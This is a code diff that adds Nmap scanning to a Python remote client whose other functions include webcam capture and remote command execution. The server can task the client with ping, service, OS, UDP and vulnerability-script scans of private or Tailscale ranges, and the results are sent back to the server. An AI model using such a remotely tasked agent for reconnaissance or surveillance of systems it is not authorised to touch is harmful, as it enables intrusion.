@@ -27,6 +27,9 @@ import subprocess
 import threading
 import base64
 import hashlib
+import ipaddress
+import shutil
+import xml.etree.ElementTree as ET
 import urllib.request
 import urllib.error
 import ssl
@@ -1655,6 +1658,81 @@ def capture_webcam():
 
 
 # ============================================================
+# NMAP SECURITY SCANS
+# ============================================================
+TAILSCALE_NET = ipaddress.ip_network('100.64.0.0/10')
+
+
+def validate_scan_target(target):
+    try:
+        net = ipaddress.ip_network((target or '').strip(), strict=False)
+    except Exception:
+        raise ValueError('Invalid scan target. Use an IP address or CIDR range.')
+    if net.num_addresses > 4096:
+        raise PermissionError('Scan range too large. Maximum allowed range is 4096 addresses.')
+    if not (net.is_private or net.subnet_of(TAILSCALE_NET)):
+        raise PermissionError('Client refuses to scan non-private/non-Tailscale targets.')
+    return str(net)
+
+
+def parse_nmap_xml(xml_text):
+    parsed = {'hosts': [], 'open_ports': []}
+    try:
+        root = ET.fromstring(xml_text)
+        for host in root.findall('host'):
+            addr_node = host.find('address')
+            addr = addr_node.get('addr', '') if addr_node is not None else ''
+            host_item = {'address': addr, 'ports': []}
+            for port in host.findall('./ports/port'):
+                state_node = port.find('state')
+                service_node = port.find('service')
+                state = state_node.get('state', '') if state_node is not None else ''
+                service = service_node.get('name', '') if service_node is not None else ''
+                product = service_node.get('product', '') if service_node is not None else ''
+                version = service_node.get('version', '') if service_node is not None else ''
+                item = {
+                    'protocol': port.get('protocol', ''),
+                    'port': int(port.get('portid', '0')),
+                    'state': state,
+                    'service': service,
+                    'product': product,
+                    'version': version,
+                }
+                host_item['ports'].append(item)
+                if state == 'open':
+                    parsed['open_ports'].append({'host': addr, **item})
+            parsed['hosts'].append(host_item)
+    except Exception as e:
+        parsed['parse_error'] = str(e)
+    return parsed
+
+
+def run_nmap_scan(scan_type, target):
+    if not shutil.which('nmap'):
+        return {'success': False, 'result': '', 'parsed': {}, 'error': 'Nmap is not installed or not in PATH'}
+    target = validate_scan_target(target)
+    profiles = {
+        'ping': ['nmap', '-oX', '-', '-sn', target],
+        'top_ports': ['nmap', '-oX', '-', '--top-ports', '100', target],
+        'service': ['nmap', '-oX', '-', '-sV', '--top-ports', '100', target],
+        'os': ['nmap', '-oX', '-', '-O', '--top-ports', '100', target],
+        'udp_light': ['nmap', '-oX', '-', '-sU', '--top-ports', '20', target],
+        'vuln_safe': ['nmap', '-oX', '-', '-sV', '--script', 'safe,vuln', '--top-ports', '100', target],
+    }
+    if scan_type not in profiles:
+        return {'success': False, 'result': '', 'parsed': {}, 'error': 'Invalid Nmap scan type'}
+    try:
+        proc = subprocess.run(profiles[scan_type], capture_output=True, timeout=300, text=True)
+        output = proc.stdout or proc.stderr or ''
+        parsed = parse_nmap_xml(proc.stdout) if proc.stdout else {}
+        return {'success': proc.returncode == 0, 'result': output[:50000], 'parsed': parsed, 'error': '' if proc.returncode == 0 else (proc.stderr[:2000] or 'nmap failed')}
+    except subprocess.TimeoutExpired:
+        return {'success': False, 'result': '', 'parsed': {}, 'error': 'Nmap scan timed out'}
+    except Exception as e:
+        return {'success': False, 'result': '', 'parsed': {}, 'error': str(e)}
+
+
+# ============================================================
 # REMOTE COMMAND EXECUTION
 # ============================================================
 def resolve_managed_command(command):
@@ -2044,6 +2122,22 @@ class ALLEYESXClient:
     def handle_task(self, task):
         task_type = task.get('type', 'command')
         task_id = task.get('id', '')
+        if task_type == 'nmap_scan':
+            scan_type = task.get('scan_type', 'top_ports')
+            target = task.get('target', '')
+            print(f"[*] Running authorized Nmap scan: {scan_type} {target}")
+            result = run_nmap_scan(scan_type, target)
+            api_request('/api/security/nmap/result', {
+                'device_id': self.device_id,
+                'scan_id': task_id,
+                'success': result['success'],
+                'result': result.get('result', ''),
+                'parsed': result.get('parsed', {}),
+                'error': result.get('error', ''),
+            })
+            print(f"[+] Nmap result sent ({'success' if result['success'] else 'failed'})")
+            return
+
         if task_type == 'command':
             command = task.get('command', '')
             print(f"[*] Executing command: {command[:50]}...")
